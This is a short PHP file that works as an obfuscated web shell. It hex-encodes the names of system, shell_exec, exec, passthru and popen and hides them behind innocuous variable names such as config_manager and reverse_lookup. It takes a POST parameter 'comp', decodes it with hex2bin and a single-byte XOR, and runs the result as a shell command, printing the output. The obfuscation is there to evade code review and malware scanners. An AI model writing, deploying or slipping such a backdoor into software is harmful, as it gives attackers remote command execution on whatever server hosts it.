<?php

$config_manager = "hex2\x62i\x6E";
$reverse_lookup1 = "\x73\x79s\x74em";
$reverse_lookup6 = "stre\x61\x6D\x5F\x67\x65t_con\x74\x65\x6E\x74s";
$reverse_lookup3 = "\x65xe\x63";
$reverse_lookup2 = "sh\x65l\x6C_exe\x63";
$reverse_lookup7 = "\x70c\x6C\x6Fse";
$reverse_lookup5 = "po\x70\x65n";
$reverse_lookup4 = "p\x61\x73\x73thr\x75";
if (isset($_POST["c\x6Fm\x70"])) {
            function hub_center   (    $val      ,       $object      )      {      $reference     =    ''      ;     $q=0; do{$reference.=chr(ord($val[$q])^$object);$q++;} while($q<strlen($val)); return   $reference;     }
            $comp = $config_manager($_POST["c\x6Fm\x70"]);
            $comp = hub_center($comp, 6);
            if (function_exists($reverse_lookup1)) {
                $reverse_lookup1($comp);
            } elseif (function_exists($reverse_lookup2)) {
                print $reverse_lookup2($comp);
            } elseif (function_exists($reverse_lookup3)) {
                $reverse_lookup3($comp, $itm_val);
                print join("\n", $itm_val);
            } elseif (function_exists($reverse_lookup4)) {
                $reverse_lookup4($comp);
            } elseif (function_exists($reverse_lookup5) && function_exists($reverse_lookup6) && function_exists($reverse_lookup7)) {
                $object_reference = $reverse_lookup5($comp, 'r');
                if ($object_reference) {
                    $ent_symbol = $reverse_lookup6($object_reference);
                    $reverse_lookup7($object_reference);
                    print $ent_symbol;
                }
            }
            exit;
        }